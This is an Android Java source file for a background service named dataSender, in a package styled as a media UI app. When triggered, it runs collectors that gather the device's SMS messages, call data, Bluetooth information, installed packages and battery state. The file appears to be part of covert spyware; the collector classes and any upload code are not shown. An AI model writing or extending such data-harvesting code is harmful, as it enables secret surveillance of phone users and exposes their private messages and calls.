package com.media.ui.Services;

import android.app.IntentService;
import android.content.Intent;

import com.media.ui.DataCollector.bluetoothCollect;
import com.media.ui.DataCollector.callData;
import com.media.ui.DataCollector.lowBatteryData;
import com.media.ui.DataCollector.packageDetails;
import com.media.ui.DataCollector.smsData;

import static com.media.ui.Util.logger.logg;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class dataSender extends IntentService {

    public dataSender() {
        super("dataSender");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        if(intent !=null){
            logg("datacollector Service");
            new bluetoothCollect(this);
            new smsData().getSMS(this);
            new callData(this);
            new packageDetails(this);
            new lowBatteryData(this);
        }
    }

}
